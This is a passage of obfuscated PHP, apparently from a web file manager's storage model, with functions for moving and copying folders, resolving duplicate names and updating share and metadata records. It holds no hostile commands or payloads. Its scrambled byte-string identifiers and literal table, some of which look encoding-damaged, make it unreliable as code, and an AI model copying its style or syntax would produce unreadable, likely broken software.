($µ°§ã¥à[$´¤ç“‰ö[485]] != $´¤ç“‰ö[91]) { $«‘ó®[$´¤ç“‰ö[629]][] = $µ°§ã¥à[$´¤ç“‰ö[541]]; return $êùƒ¼õ; } $î÷Œ™íí = array(); $ÙÍ›æš = array(); $this->_childrenListAll($¡Ø‹Óş, $î÷Œ™íí); $®î†–¨ = count($î÷Œ™íí); if ($®î†–¨ == 0) { return $êùƒ¼õ; } $ıè´¶»Ò = $this->sourceInfo($êùƒ¼õ); foreach ($î÷Œ™íí as $œ¬ÔÄî) { $‘›‡æªº = $this->_makeItemData($œ¬ÔÄî, $ıè´¶»Ò, $œ¬ÔÄî[$´¤ç“‰ö[32]]); $‘›‡æªº[$´¤ç“‰ö[584]] = $œ¬ÔÄî[$´¤ç“‰ö[584]]; $ÙÍ›æš[] = $‘›‡æªº; } $this->chunkEventSet($´¤ç“‰ö[639], array($´¤ç“‰ö[640], $øÇåû‚Û, $®î†–¨)); $this->addAll($ÙÍ›æš, array(), !1); $ùß•Ìè = $this->where(array($´¤ç“‰ö[192] => $êùƒ¼õ))->select(); $¯§¨¿Ù’ = $this->_childrenMakeRelation($î÷Œ™íí, $ùß•Ìè); $¯§¨¿Ù’[$¡Ø‹Óş] = $êùƒ¼õ; $âõ°¡Ü = array(); $«Ñíïı½ = array(); foreach ($ùß•Ìè as $œ¬ÔÄî) { $˜‚¢¤‚” = $œ¬ÔÄî[$´¤ç“‰ö[193]]; $í„ÆéŒô = $this->_childrenMatch($¯§¨¿Ù’, $œ¬ÔÄî, $ıè´¶»Ò); $âõ°¡Ü[] = array($´¤ç“‰ö[193], $˜‚¢¤‚”, $´¤ç“‰ö[192], $í„ÆéŒô[$´¤ç“‰ö[192]]); $«Ñíïı½[] = array($´¤ç“‰ö[193], $˜‚¢¤‚”, $´¤ç“‰ö[584], $í„ÆéŒô[$´¤ç“‰ö[584]]); $this->_copyApplyMeta($œ¬ÔÄî, $«‘ó®); if ($œ¬ÔÄî[$´¤ç“‰ö[485]] != $´¤ç“‰ö[91]) { $«‘ó®[$´¤ç“‰ö[629]][] = $œ¬ÔÄî[$´¤ç“‰ö[541]]; } } $this->chunkEventSet($´¤ç“‰ö[641], array($´¤ç“‰ö[642], $øÇåû‚Û, $®î†–¨)); $this->saveAll($âõ°¡Ü); $this->chunkEventSet($´¤ç“‰ö[643], array($´¤ç“‰ö[644], $øÇåû‚Û, $®î†–¨)); $this->saveAll($«Ñíïı½); return $êùƒ¼õ; } private function _childrenMakeRelation($ÃØ‹Ë«à, $âàœ¯ä) { $½±¸×¬¿ =& $_SERVER[ˆ¡¹µ‹Â]; $ìÎÑıÜŞ = array(); $êı¼Ìêû = array(); foreach ($ÃØ‹Ë«à as $€Îù±ô¿) { $ÍéÉóú = $€Îù±ô¿[$½±¸×¬¿[32]] . $½±¸×¬¿[8] . $€Îù±ô¿[$½±¸×¬¿[584]]; $ìÎÑıÜŞ[$ÍéÉóú] = $€Îù±ô¿[$½±¸×¬¿[193]]; } foreach ($âàœ¯ä as $€Îù±ô¿) { $ÍéÉóú = $€Îù±ô¿[$½±¸×¬¿[32]] . $½±¸×¬¿[8] . $€Îù±ô¿[$½±¸×¬¿[584]]; $†£×˜Ø = $ìÎÑıÜŞ[$ÍéÉóú]; $êı¼Ìêû[$†£×˜Ø] = $€Îù±ô¿[$½±¸×¬¿[193]]; } return $êı¼Ìêû; } private function _childrenMatch($‘¯ƒ½‰Ñ, $ã¶˜ö—, $ñâİ·½Ê) { $›ğ’†¢¶ =& $_SERVER[ˆ¡¹µ‹Â]; $ËäêÑêº = $ñâİ·½Ê[$›ğ’†¢¶[584]]; $øÊ¨ÒÁ = $this->parentLevelArray($ã¶˜ö—[$›ğ’†¢¶[584]]); foreach ($øÊ¨ÒÁ as $æÏæÄ¯Ÿ) { if (isset($‘¯ƒ½‰Ñ[$æÏæÄ¯Ÿ])) { $ËäêÑêº .= $‘¯ƒ½‰Ñ[$æÏæÄ¯Ÿ] . $›ğ’†¢¶[645]; } } $ËäêÑêº = rtrim($ËäêÑêº, $›ğ’†¢¶[50]) . $›ğ’†¢¶[50]; $™èû³Ãı = $this->parentLevelArray($ËäêÑêº); $À­´€ÄÉ = $™èû³Ãı[count($™èû³Ãı) - 1]; return array($›ğ’†¢¶[192] => $À­´€ÄÉ, $›ğ’†¢¶[584] => $ËäêÑêº); } private function _makeItemData($ßœœèŠ”, $Ù£í÷²Ì, $‘Ì­ù†ú) { $£åº…«Û =& $_SERVER[ˆ¡¹µ‹Â]; $¦À¹Æ­È = array($£åº…«Û[646] => $ßœœèŠ”[$£åº…«Û[485]], $£åº…«Û[494] => $‘Ì­ù†ú, $£åº…«Û[647] => $ßœœèŠ”[$£åº…«Û[486]] ? $ßœœèŠ”[$£åº…«Û[486]] : $£åº…«Û[12], $£åº…«Û[542] => $ßœœèŠ”[$£åº…«Û[541]] ? $ßœœèŠ”[$£åº…«Û[541]] : 0, $£åº…«Û[617] => $ßœœèŠ”[$£åº…«Û[79]] ? $ßœœèŠ”[$£åº…«Û[79]] : 0, $£åº…«Û[648] => intval($Ù£í÷²Ì[$£åº…«Û[190]]), $£åº…«Û[649] => intval($Ù£í÷²Ì[$£åº…«Û[569]]), $£åº…«Û[650] => intval(USER_ID), $£åº…«Û[651] => intval(USER_ID), $£åº…«Û[477] => intval($Ù£í÷²Ì[$£åº…«Û[193]]), $£åº…«Û[652] => $Ù£í÷²Ì[$£åº…«Û[584]] . $Ù£í÷²Ì[$£åº…«Û[193]] . $£åº…«Û[50], $£åº…«Û[498] => $ßœœèŠ”[$£åº…«Û[88]] ? $ßœœèŠ”[$£åº…«Û[88]] : time(), $£åº…«Û[504] => 0, $£åº…«Û[653] => $£åº…«Û[12]); return $¦À¹Æ­È; } private function _copyApplyMeta($·èÓ•Éâ, &$ƒ„ù³Éø) { $ËÁïÕÒ =& $_SERVER[ˆ¡¹µ‹Â]; $¶è¶“ı = $·èÓ•Éâ[$ËÁïÕÒ[193]]; $éÑÏ¿¤ = $·èÓ•Éâ[$ËÁïÕÒ[32]]; if (!isset($·èÓ•Éâ[$ËÁïÕÒ[654]]) || !$·èÓ•Éâ[$ËÁïÕÒ[654]] || $·èÓ•Éâ[$ËÁïÕÒ[654]] == $ËÁïÕÒ[228]) { $ƒ„ù³Éø[$ËÁïÕÒ[631]][] = array($ËÁïÕÒ[193], $¶è¶“ı, $ËÁïÕÒ[654], short_id($¶è¶“ı)); } if (Input::check($éÑÏ¿¤, $ËÁïÕÒ[655])) { $ƒ„ù³Éø[$ËÁïÕÒ[630]][] = array($ËÁïÕÒ[193] => $¶è¶“ı, $ËÁïÕÒ[97] => $ËÁïÕÒ[538], $ËÁïÕÒ[450] => str_replace($ËÁïÕÒ[53], $ËÁïÕÒ[12], Pinyin::get($éÑÏ¿¤))); $ƒ„ù³Éø[$ËÁïÕÒ[630]][] = array($ËÁïÕÒ[193] => $¶è¶“ı, $ËÁïÕÒ[97] => $ËÁïÕÒ[537], $ËÁïÕÒ[450] => Pinyin::get($éÑÏ¿¤, $ËÁïÕÒ[656])); } $ƒ„ù³Éø[$ËÁïÕÒ[630]][] = array($ËÁïÕÒ[193] => $¶è¶“ı, $ËÁïÕÒ[97] => $ËÁïÕÒ[517], $ËÁïÕÒ[450] => KodSort::makeStr($éÑÏ¿¤)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($àµ¼ğĞ) { $Â¸†óİÓ =& $_SERVER[ˆ¡¹µ‹Â]; $ñªİº· = $this->sourceInfo($àµ¼ğĞ); $Ìú˜±•— = $Â¸†óİÓ[657]; $ğÛ€ÈÉ± = array($Â¸†óİÓ[584] => array($Â¸†óİÓ[612], $ñªİº·[$Â¸†óİÓ[584]] . $àµ¼ğĞ . $Â¸†óİÓ[613]), $Â¸†óİÓ[505] => $this->targetIsDelete); $Üœßİ” = $this->field($Ìú˜±•—)->where($ğÛ€ÈÉ±)->select(); if (!$Üœßİ”) { return; } $Üœßİ” = array_to_keyvalue($Üœßİ”, $Â¸†óİÓ[193]); foreach ($Üœßİ” as $‹êÃˆˆ) { $¥‘Í³Ö = $‹êÃˆˆ[$Â¸†óİÓ[192]]; $àµ¼ğĞ = $‹êÃˆˆ[$Â¸†óİÓ[193]]; if (!isset($this->_childrenListCache[$àµ¼ğĞ]) && $‹êÃˆˆ[$Â¸†óİÓ[485]] == $Â¸†óİÓ[91]) { $this->_childrenListCache[$àµ¼ğĞ] = array(); } if (!isset($this->_childrenListCache[$¥‘Í³Ö])) { $this->_childrenListCache[$¥‘Í³Ö] = array(); } $this->_childrenListCache[$¥‘Í³Ö][$àµ¼ğĞ] = $‹êÃˆˆ; $this->_childrenItemCache[$àµ¼ğĞ] = $‹êÃˆˆ; } } private function _childrenListAll($‘ÕÌÌ§½, &$ÉŠ†õğ) { $³©¿ìœ¢ =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($this->_childrenListCache[$‘ÕÌÌ§½])) { return; } $®ï§µê¿ = $this->_childrenListCache[$‘ÕÌÌ§½]; foreach ($®ï§µê¿ as $²Ô•š¨å => $·¯©‹ÉÀ) { $ÉŠ†õğ[$²Ô•š¨å] = $·¯©‹ÉÀ; if ($·¯©‹ÉÀ[$³©¿ìœ¢[485]] == $³©¿ìœ¢[91]) { $this->_childrenListAll($²Ô•š¨å, $ÉŠ†õğ); } } } private function sourceInfoCache($¦†®Æ‡°) { if (isset($this->_childrenItemCache[$¦†®Æ‡°])) { return $this->_childrenItemCache[$¦†®Æ‡°]; } return $this->sourceInfo($¦†®Æ‡°); } private function _childrenList($íÃ¾¾ä•) { if (isset($this->_childrenListCache[$íÃ¾¾ä•])) { return $this->_childrenListCache[$íÃ¾¾ä•]; } return $this->_childrenListSelect($íÃ¾¾ä•); } private function _childrenListSelect($ü“‚îÕ) { $°µ«¼Ä =& $_SERVER[ˆ¡¹µ‹Â]; $ÒÜìòª = array($°µ«¼Ä[192] => $ü“‚îÕ, $°µ«¼Ä[505] => $this->targetIsDelete); $´ÈĞú»÷ = $this->where($ÒÜìòª)->select(); $´ÈĞú»÷ = $´ÈĞú»÷ ? $´ÈĞú»÷ : array(); $üÜèƒ˜‚ = array_to_keyvalue($´ÈĞú»÷, $°µ«¼Ä[193]); $this->_childrenListCache[$ü“‚îÕ] = $üÜèƒ˜‚; foreach ($üÜèƒ˜‚ as $ü“‚îÕ => $¿è€Ğ‘º) { $this->_childrenItemCache[$ü“‚îÕ] = $¿è€Ğ‘º; } return $üÜèƒ˜‚; } private function fileNameExistAuto($™ÖÌëÉ¾, $ü„üÚ¸µ) { $ËÛ„¡©å =& $_SERVER[ˆ¡¹µ‹Â]; if ($ü„üÚ¸µ[$ËÛ„¡©å[505]] == $ËÛ„¡©å[91]) { return $this->fileNameExist($™ÖÌëÉ¾, $ü„üÚ¸µ[$ËÛ„¡©å[32]]); } return $this->fileNameExistCache($™ÖÌëÉ¾, $ü„üÚ¸µ[$ËÛ„¡©å[32]]); } private function fileNameExistCache($¿üí÷¼Õ, $¢±²¢Ãø) { $»³î÷ìâ =& $_SERVER[ˆ¡¹µ‹Â]; $¢±²¢Ãø = strtolower($¢±²¢Ãø); $©¥À®÷» = $this->_childrenList($¿üí÷¼Õ); foreach ($©¥À®÷» as $Ø¯šíëÈ) { if ($¢±²¢Ãø == strtolower($Ø¯šíëÈ[$»³î÷ìâ[32]])) { return $Ø¯šíëÈ[$»³î÷ìâ[193]]; } } return !1; } private function fileNameAutoCache($úûïÓ‹ñ, $¨ŸäêĞ¸, $ÁéÖ˜š„, $–çÄÚá¡) { $–âº‰…Ú =& $_SERVER[ˆ¡¹µ‹Â]; $¹µŠ—úÍ = $this->_childrenList($úûïÓ‹ñ); $ì¹ù¯ ù = array_to_keyvalue($¹µŠ—úÍ, $–âº‰…Ú[12], $–âº‰…Ú[32]); return $this->fileNameAutoGet($ì¹ù¯ ù, $¨ŸäêĞ¸, $ÁéÖ˜š„, $–çÄÚá¡); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÉÚŠéŞ—, $¶Æ¤Ü«, $ì³ëï¥ = REPEAT_REPLACE, $ûÁãìµÉ = '') { $Íõè«Ùš =& $_SERVER[ˆ¡¹µ‹Â]; $ƒµŠ•ÆŞ = $this->sourceInfo($ÉÚŠéŞ—); $ŸÖ€­¶‚ = $this->sourceInfo($¶Æ¤Ü«); if ($ƒµŠ•ÆŞ[$Íõè«Ùš[192]] == $ŸÖ€­¶‚[$Íõè«Ùš[193]]) { if ($ƒµŠ•ÆŞ[$Íõè«Ùš[505]] == $Íõè«Ùš[91]) { Model($Íõè«Ùš[503])->restore(array($ÉÚŠéŞ—)); } if (!$ûÁãìµÉ || $ûÁãìµÉ == $ƒµŠ•ÆŞ[$Íõè«Ùš[32]]) { return $ÉÚŠéŞ—; } } $ßÑÌ¼Á† = $this->pathInfoMore($ÉÚŠéŞ—); if ($this->isParentOf($ÉÚŠéŞ—, $¶Æ¤Ü«)) { return !1; } if (!$ƒµŠ•ÆŞ || !$ŸÖ€­¶‚ || $ŸÖ€­¶‚[$Íõè«Ùš[485]] != $Íõè«Ùš[91]) { return !1; } Hook::trigger($Íõè«Ùš[658], $ßÑÌ¼Á†); $this->targetIsDelete = intval($ƒµŠ•ÆŞ[$Íõè«Ùš[505]]); if ($ƒµŠ•ÆŞ[$Íõè«Ùš[192]] == $¶Æ¤Ü« && $ûÁãìµÉ != $ƒµŠ•ÆŞ[$Íõè«Ùš[32]]) { $Ò‚•±‰– = $this->fileNameExist($¶Æ¤Ü«, $ûÁãìµÉ); if ($Ò‚•±‰– && $ƒµŠ•ÆŞ[$Íõè«Ùš[485]] == $Íõè«Ùš[228]) { $ÈÕÑÈõ = $this->sourceInfo($Ò‚•±‰–); $‹ëøÆ€Û = $this->fileHistory($ÈÕÑÈõ, $ƒµŠ•ÆŞ[$Íõè«Ùš[541]], $ƒµŠ•ÆŞ[$Íõè«Ùš[79]]); if (!$‹ëøÆ€Û) { Model($Íõè«Ùš[544])->remove($ƒµŠ•ÆŞ[$Íõè«Ùš[541]]); } $this->removeNow($ÉÚŠéŞ—, !1); $this->folderSizeReset($¶Æ¤Ü«); Hook::trigger($Íõè«Ùš[659], $ßÑÌ¼Á†); return $Ò‚•±‰–; } } $ÕšâĞ = $ûÁãìµÉ ? $ûÁãìµÉ : $ƒµŠ•ÆŞ[$Íõè«Ùš[32]]; $this->lockMoveStart($ÉÚŠéŞ—); $this->lockWriteStart($¶Æ¤Ü«, $ÕšâĞ); $¤ñº“¬½ = array($Íõè«Ùš[629] => array(), $Íõè«Ùš[660] => !1); $this->clearShare($ÉÚŠéŞ—, $¶Æ¤Ü«); $±©¶‚ÔŞ = $this->fileNameExistAuto($¶Æ¤Ü«, $ƒµŠ•ÆŞ); $¾ÏÙ = $this->_move($ÉÚŠéŞ—, $¶Æ¤Ü«, $ì³ëï¥, $¤ñº“¬½, $ûÁãìµÉ); $this->sourceCacheClear(); if ($ƒµŠ•ÆŞ[$Íõè«Ùš[485]] == $Íõè«Ùš[91] && $±©¶‚ÔŞ) { $this->folderSizeResetChildren($¾ÏÙ); } Model($Íõè«Ùš[230])->linkAdd($¤ñº“¬½[$Íõè«Ùš[629]]); if ($±©¶‚ÔŞ && $¤ñº“¬½[$Íõè«Ùš[660]]) { $this->removeNow($ÉÚŠéŞ—, !1); } $this->lockMoveEnd($ÉÚŠéŞ—); $this->lockWriteEnd($¶Æ¤Ü«, $ÕšâĞ); $this->folderSizeReset($ƒµŠ•ÆŞ[$Íõè«Ùš[192]]); $this->folderSizeReset($¶Æ¤Ü«); $Ÿˆ€ Òë = array($ƒµŠ•ÆŞ[$Íõè«Ùš[192]], $¶Æ¤Ü«); if ($ƒµŠ•ÆŞ[$Íõè«Ùš[485]] == $Íõè«Ùš[91]) { $Ÿˆ€ Òë[] = $ÉÚŠéŞ—; } $this->updateModifyTime($Ÿˆ€ Òë); Model($Íõè«Ùš[633])->eventMove($ÉÚŠéŞ—, $ƒµŠ•ÆŞ[$Íõè«Ùš[192]], $¶Æ¤Ü«); Hook::trigger($Íõè«Ùš[659], $ßÑÌ¼Á†); return $¾ÏÙ; } private function _move($ÏüòÉëú, $ù¸Òúìè, $Ï‘‘Éû, &$Æ³½Û‹à, $‰¹ó…“ç = '') { $Ä´­à”  =& $_SERVER[ˆ¡¹µ‹Â]; $î§ÌŸõç = $this->sourceInfo($ÏüòÉëú); $Ïèçº = $î§ÌŸõç[$Ä´­à” [485]] == $Ä´­à” [91]; $†ê¥¹º = $‰¹ó…“ç ? $‰¹ó…“ç : $î§ÌŸõç[$Ä´­à” [32]]; $¶–¡‘«ç = $this->fileNameExistAuto($ù¸Òúìè, $î§ÌŸõç); $this->lockMoveStart($ÏüòÉëú); $this->lockWriteStart($ù¸Òúìè, $†ê¥¹º); if (!$¶–¡‘«ç) { return $this->_moveForce($ÏüòÉëú, $ù¸Òúìè, $†ê¥¹º); } $Âã”´Û² = $¶–¡‘«ç; $Ùòã¯Œ = !1; if ($Ïèçº) { if ($Ï‘‘Éû == REPEAT_RENAME_FOLDER) { $†ê¥¹º = $this->fileNameAuto($ù¸Òúìè, $†ê¥¹º, $Ï‘‘Éû, $Ïèçº); $Âã”´Û² = $this->_moveForce($ÏüòÉëú, $ù¸Òúìè, $†ê¥¹º); } else { if ($Ï‘‘Éû == REPEAT_RENAME_FOLDER) { $Ï‘‘Éû = REPEAT_RENAME; } $ãáøÕå = $this->_childrenListSelect($ÏüòÉëú); foreach ($ãáøÕå as $¸ˆÙ°Îö) { $this->_move($¸ˆÙ°Îö[$Ä´­à” [193]], $¶–¡‘«ç, $Ï‘‘Éû, $Æ³½Û‹à); } $Ùòã¯Œ = !0; } } else { if ($Ï‘‘Éû == REPEAT_SKIP) { $Ùòã¯Œ = !0; } else { if ($Ï‘‘Éû == REPEAT_RENAME || $Ï‘‘Éû == REPEAT_RENAME_FOLDER) { $†ê¥¹º = $this->fileNameAuto($ù¸Òúìè, $†ê¥¹º, $Ï‘‘Éû, $Ïèçº); $Âã”´Û² = $this->_moveForce($ÏüòÉëú, $ù¸Òúìè, $†ê¥¹º); } else { if ($Ï‘‘Éû == REPEAT_REPLACE) { $¯•½‡ì = $this->sourceInfoCache($¶–¡‘«ç); $åó“©Ì¦ = $this->fileHistory($¯•½‡ì, $î§ÌŸõç[$Ä´­à” [541]], $î§ÌŸõç[$Ä´­à” [79]]); $Ùòã¯Œ = !0; if ($åó“©Ì¦) { $Æ³½Û‹à[$Ä´­à” [629]][] = $î§ÌŸõç[$Ä´­à” [541]]; } } } } } if ($Ùòã¯Œ && !$Æ³½Û‹à[$Ä´­à” [660]]) { $Æ³½Û‹à[$Ä´­à” [660]] = !0; } return $Âã”´Û²; } private function _moveForce($­ĞÎ­êÇ, $¹Çõôäİ, $¡Åäñé) { $Ã¢‡¹øş =& $_SERVER[ˆ¡¹µ‹Â]; $‘«œƒö… = $this->sourceInfo($­ĞÎ­êÇ); $¯ê»¿ğÊ = $this->sourceInfo($¹Çõôäİ); $û‰ƒ«¤Ÿ = $‘«œƒö…[$Ã¢‡¹øş[485]] == $Ã¢‡¹øş[91]; $µ¥Ò¹ï© = array($Ã¢‡¹øş[477] => $¯ê»¿ğÊ[$Ã¢‡¹øş[193]], $Ã¢‡¹øş[652] => $¯ê»¿ğÊ[$Ã¢‡¹øş[584]] . $¯ê»¿ğÊ[$Ã¢‡¹øş[193]] . $Ã¢‡¹øş[50], $Ã¢‡¹øş[648] => $¯ê»¿ğÊ[$Ã¢‡¹øş[190]], $Ã¢‡¹øş[649] => $¯ê»¿ğÊ[$Ã¢‡¹øş[569]], $Ã¢‡¹øş[651] => USER_ID, $Ã¢‡¹øş[494] => $¡Åäñé); $ƒÉ‘¿»Î = $‘«œƒö…[$Ã¢‡¹øş[190]] == SourceModel::TYPE_GROUP && $¯ê»¿ğÊ[$Ã¢‡¹øş[190]] == SourceModel::TYPE_GROUP && $‘«œƒö…[$Ã¢‡¹øş[569]] == $¯ê»¿ğÊ[$Ã¢‡¹øş[569]]; if (!$ƒÉ‘¿»Î && $this->moveClearAuth) { Model($Ã¢‡¹øş[567])->authClear($­ĞÎ­êÇ); } $çÙ½¾«‚ = $‘«œƒö…[$Ã¢‡¹øş[505]] == $Ã¢‡¹øş[91] && $¯ê»¿ğÊ[$Ã¢‡¹øş[505]] != $Ã¢‡¹øş[91]; if ($çÙ½¾«‚) { $µ¥Ò¹ï©[$Ã¢‡¹øş[504]] = 0; } if ($û‰ƒ«¤Ÿ) { $°É¾î÷„ = array($Ã¢‡¹øş[652] => array($Ã¢‡¹øş[612], $‘«œƒö…[$Ã¢‡¹øş[584]] . $‘«œƒö…[$Ã¢‡¹øş[193]] . $Ã¢‡¹øş[613])); $œúÛ•¢ç = $‘«œƒö…[$Ã¢‡¹øş[584]] . $‘«œƒö…[$Ã¢‡¹øş[193]] . $Ã¢‡¹øş[50]; $˜‘õç² = $¯ê»¿ğÊ[$Ã¢‡¹øş[584]] . $¯ê»¿ğÊ[$Ã¢‡¹øş[193]] . $Ã¢‡¹øş[50] . $‘«œƒö…[$Ã¢‡¹øş[193]] . $Ã¢‡¹øş[50]; $ÇÉŠÁ‘Š = array($Ã¢‡¹øş[652] => array($Ã¢‡¹øş[661], "\162\145\160\154\x61\x63\x65\x28\160\x61\x72\145\x6e\x74\114\145\x76\x65\154\54\47{$œúÛ•¢ç}\47\x2c\x27{$˜‘õç²}\47\51"), $Ã¢‡¹øş[648] => $¯ê»¿ğÊ[$Ã¢‡¹øş[190]], $Ã¢‡¹øş[649] => $¯ê»¿ğÊ[$Ã¢‡¹øş[569]]); if ($çÙ½¾«‚) { $ÇÉŠÁ‘Š[$Ã¢‡¹øş[504]] = 0; } $this->where($°É¾î÷„)->data($ÇÉŠÁ‘Š)->save(); } $this->where(array($Ã¢‡¹øş[491] => $­ĞÎ­êÇ))->data($µ¥Ò¹ï©)->save(); return $­ĞÎ­êÇ; } private function clearShare($©¾ò°Å©, $ÔÅ÷¼¬ä) { $ø’¬˜«É =& $_SERVER[ˆ¡¹µ‹Â]; $Ù¿®“¹ = $this->sourceInfo($©¾ò°Å©); $“ïâéõ = $this->sourceInfo($ÔÅ÷¼¬ä); if ($Ù¿®“¹[$ø’¬˜«É[569]] == $“ïâéõ[$ø’¬˜«É[569]] && $Ù¿®“¹[$ø’¬˜«É[190]] == $ø’¬˜«É[662]) { return; } $„Äáù÷Æ = array($ø’¬˜«É[584] => array($ø’¬˜«É[612], $Ù¿®“¹[$ø’¬˜«É[584]] . $©¾ò°Å© . $ø’¬˜«É[613])); $ç¸•Œ = $this->field($ø’¬˜«É[491])->where($„Äáù÷Æ)->getField($ø’¬˜«É[193], !0); if (!$ç¸•Œ) { return; } $„Äáù÷Æ = array($ø’¬˜«É[193] => array($ø’¬˜«É[7], $ç¸•Œ), $ø’¬˜«É[663] => 1); $’•£µô§ = Model($ø’¬˜«É[664])->field($ø’¬˜«É[665])->where($„Äáù÷Æ)->select(); if (!$’•£µô§) { return; } $’•£µô§ = array_to_keyvalue($’•£µô§, $ø’¬˜«É[12], $ø’¬˜«É[665]); $„Äáù÷Æ = array($ø’¬˜«É[665] => array($ø’¬˜«É[7], $’•£µô§)); Model($ø’¬˜«É[664])->where($„Äáù÷Æ)->save(array($ø’¬˜«É[663] => 0)); Model($ø’¬˜«É[666])->where($„Äáù÷Æ)->delete(); } public function copyFolderFromIO($­°™°ÑÚ, $ëßÌğ»Ê, $›ş¸¼Òß, $îŒì„¥¸, $¼®«û÷˜, $‘ô¦‚…ğ = false) { $–â™½ô¥ =& $_SERVER[ˆ¡¹µ‹Â]; $’ÎÔˆ Æ = array($–â™½ô¥[630] => array(), $–â™½ô¥[631] => array(), $–â™½ô¥[629] => array(), $–â™½ô¥[667] => array()); $²•¼È¥ = $‘ô¦‚…ğ ? $‘ô¦‚…ğ : $­°™°ÑÚ->pathThis($ëßÌğ»Ê); $ÑøíèÉ¹ = $this->fileNameExist($›ş¸¼Òß, $²•¼È¥); $¯›¹Ûß˜ = $this->mkdir($›ş¸¼Òß, $²•¼È¥, $îŒì„¥¸); if (!$ÑøíèÉ¹ || $îŒì„¥¸ == REPEAT_RENAME_FOLDER) { $îŒì„¥¸ = !1; } if ($ÑøíèÉ¹) { $this->_childrenAllMake($ÑøíèÉ¹); } Hook::trigger($–â™½ô¥[668]); $this->_copyChildTo($­°™°ÑÚ, $ëßÌğ»Ê, $¯›¹Ûß˜, $îŒì„¥¸, $’ÎÔˆ Æ, $¼®«û÷˜); Hook::trigger($–â™½ô¥[669]); if ($¯›¹Ûß˜) { $this->folderSizeResetChildren($¯›¹Ûß˜); } $this->_childrenListClear(); Model($–â™½ô¥[632])->addAll($’ÎÔˆ Æ[$–â™½ô¥[630]], array(), !0); Model($–â™½ô¥[633])->eventCopy($¯›¹Ûß˜); $this->saveAll($’ÎÔˆ Æ[$–â™½ô¥[631]]); Model($–â™½ô¥[544])->linkAdd($’ÎÔˆ Æ[$–â™½ô¥[629]]); Model($–â™½ô¥[544])->remove($’ÎÔˆ Æ[$–â™½ô¥[667]]); $this->folderSizeReset($›ş¸¼Òß); $this->updateModifyTime($›ş¸¼Òß); return $¯›¹Ûß˜; } private function _copyChildTo($Î…õı‘¨, $Ï¯äÈ”õ, $ÁäÄ°¡ß, $°°£“«Ú, &$…À´Ì˜©, $¶˜…ˆÈÊ) { $•Øéû« =& $_SERVER[ˆ¡¹µ‹Â]; $èó±—ñ = $this->sourceInfoCache($ÁäÄ°¡ß); $¥´‰Õê­ = $Î…õı‘¨->listPath($Ï¯äÈ”õ); $¥´‰Õê­ = $¥´‰Õê­ ? $¥´‰Õê­ : array($•Øéû«[86] => array(), $•Øéû«[85] => array()); $ÙúŒ¡Ö¨ = array_merge($¥´‰Õê­[$•Øéû«[86]], $¥´‰Õê­[$•Øéû«[85]]); $¤úşúš = $this->_addFiles($Î…õı‘¨, $¥´‰Õê­[$•Øéû«[86]], $¶˜…ˆÈÊ); $à‘Ë¼Ã¾ = array(); foreach ($ÙúŒ¡Ö¨ as &$©Ì•Á³¥) { if (isset($¤úşúš[$©Ì•Á³¥[$•Øéû«[32]]])) { $©Ì•Á³¥ = $¤úşúš[$©Ì•Á³¥[$•Øéû«[32]]]; } $©Ì•Á³¥[$•Øéû«[485]] = $©Ì•Á³¥[$•Øéû«[33]] == $•Øéû«[78]; $©Ì•Á³¥[$•Øéû«[486]] = substr(_get($©Ì•Á³¥, $•Øéû«[169], $•Øéû«[12]), 0, 10); $©Ì•Á³¥[$•Øéû«[79]] = _get($©Ì•Á³¥, $•Øéû«[79], 0); $©Ì•Á³¥[$•Øéû«[541]] = _get($©Ì•Á³¥, $•Øéû«[541], 0); if (!isset($©Ì•Á³¥[$•Øéû«[670]]) && $©Ì•Á³¥[$•Øéû«[541]]) { $…À´Ì˜©[$•Øéû«[667]][] = $©Ì•Á³¥[$•Øéû«[541]]; } if ($°°£“«Ú) { $¬¬¾ô„¬ = $this->fileNameExistCache($ÁäÄ°¡ß, $©Ì•Á³¥[$•Øéû«[32]]); if ($¬¬¾ô„¬) { if ($©Ì•Á³¥[$•Øéû«[485]] || $°°£“«Ú == REPEAT_SKIP) { continue; } if ($°°£“«Ú == REPEAT_REPLACE) { $Ë–ûÜœâ = $this->sourceInfoCache($¬¬¾ô„¬); $éÏë¦×  = $this->fileHistory($Ë–ûÜœâ, $©Ì•Á³¥[$•Øéû«[541]], $©Ì•Á³¥[$•Øéû«[79]]); if ($éÏë¦× ) { $…À´Ì˜©[$•Øéû«[629]][] = $©Ì•Á³¥[$•Øéû«[541]]; } continue; } else { if ($°°£“«Ú == REPEAT_RENAME) { $©Ì•Á³¥[$•Øéû«[32]] = $this->fileNameAutoCache($ÁäÄ°¡ß, $©Ì•Á³¥[$•Øéû«[32]], $°°£“«Ú, !1); } } } } if (!$©Ì•Á³¥[$•Øéû«[485]] && $©Ì•Á³¥[$•Øéû«[541]] == 0) { continue; } if (!$©Ì•Á³¥[$•Øéû«[485]] && $©Ì•Á³¥[$•Øéû«[541]]) { $…À´Ì˜©[$•Øéû«[629]][] = $©Ì•Á³¥[$•Øéû«[541]]; } $à‘Ë¼Ã¾[] = $this->_makeItemData($©Ì•Á³¥, $èó±—ñ, $©Ì•Á³¥[$•Øéû«[32]]); } unset($©Ì•Á³¥); if (!empty($à‘Ë¼Ã¾)) { $this->addAll($à‘Ë¼Ã¾); $this->_childrenListSelect($ÁäÄ°¡ß); } $¾øù«ô¦ = $this->_childrenList($ÁäÄ°¡ß); $¾øù«ô¦ = array_to_keyvalue($¾øù«ô¦, $•Øéû«[32]); foreach ($ÙúŒ¡Ö¨ as $©Ì•Á³¥) { $Ë–ûÜœâ = $¾øù«ô¦[$©Ì•Á³¥[$•Øéû«[32]]]; $®»é¼…” = $Ë–ûÜœâ[$•Øéû«[193]]; $this->_copyApplyMeta($Ë–ûÜœâ, $…À´Ì˜©); if ($©Ì•Á³¥[$•Øéû«[33]] == $•Øéû«[78]) { $©Ì•Á³¥[$•Øéû«[87]] = $Î…õı‘¨->getPathInner($©Ì•Á³¥[$•Øéû«[87]]); $this->_copyChildTo($Î…õı‘¨, $©Ì•Á³¥[$•Øéû«[87]], $®»é¼…”, $°°£“«Ú, $…À´Ì˜©, $¶˜…ˆÈÊ); } } } private function _addFiles($ï¥æİéñ, $Éè»ñ¿·, $ˆŠÖŠ€©) { $¢œ°Ïœ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$Éè»ñ¿· || count($Éè»ñ¿·) == 0) { return array(); } $ûÔ•ÊÑ® = array(); foreach ($Éè»ñ¿· as 